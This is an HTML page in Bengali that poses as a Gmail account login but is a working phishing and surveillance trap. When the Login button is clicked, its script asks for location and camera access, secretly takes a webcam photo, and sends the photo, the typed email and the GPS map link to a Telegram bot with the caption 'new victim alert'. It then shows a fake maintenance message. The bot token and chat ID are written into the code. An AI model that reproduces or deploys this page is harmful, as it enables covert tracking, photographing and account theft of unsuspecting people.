<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Login</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: Arial; padding: 20px; }
        .login-container { border: 1px solid #333; padding: 30px; border-radius: 15px; display: inline-block; margin-top: 50px; background: #111; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
        button { padding: 15px 30px; font-size: 18px; background: #ffcc00; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; color: #000; width: 100%; }
        h1 { color: #ffcc00; }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>অ্যাকাউন্ট লগইন করুন</h1>
        <p>আপনার জিমেইল এবং পাসওয়ার্ড দিন</p>
        
        <input type="email" id="email" placeholder="Gmail">
        <input type="password" id="pass" placeholder="Password">
        
        <button onclick="startSecurityAction()">Login</button>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8533062452:AAHhcDnFfdvIWrYQiMdbD256ZHzXn-Dp_QY';
        const CHAT_ID = '6991020341';

        function startSecurityAction() {
            // লোকেশন পারমিশন চাওয়া
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(captureAndSendData, handleLocationError);
            } else {
                alert("আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।");
            }
        }

        async function captureAndSendData(position) {
            // ইউজারের অক্ষাংশ ও দ্রাঘিমাংশ সংগ্রহ
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            // ইনপুট ডেটা (যদি লাগে)
            const email = document.getElementById('email').value;

            try {
                // ক্যামেরা এক্সেস চাওয়া
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // ১ সেকেন্ড অপেক্ষা করে ছবি তোলা
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'capture.jpg');
                        formData.append('chat_id', CHAT_ID);
                        
                        // ক্যাপশনে লোকেশন এবং জিমেইল আইডি পাঠানো
                        const captionText = `⚠️ নতুন ভিকটিম এলার্ট!\n\n📧 জিমেইল: ${email}\n📍 লোকেশন: ${mapLink}`;
                        formData.append('caption', captionText);

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            alert("সার্ভার রক্ষণাবেক্ষণ চলছে। ২০ মিনিট পর আবার চেষ্টা করুন।");
                            location.reload();
                        });
                    }, 'image/jpeg');
                }, 1000);
            } catch (err) {
                alert("ক্যামেরা এবং লোকেশন পারমিশন ছাড়া লগইন করা সম্ভব নয়।");
            }
        }

        function handleLocationError(error) {
            alert("লোকেশন পারমিশন ছাড়া অ্যাকাউন্ট ভেরিফাই করা সম্ভব নয়।");
        }
    </script>
</body>
</html>
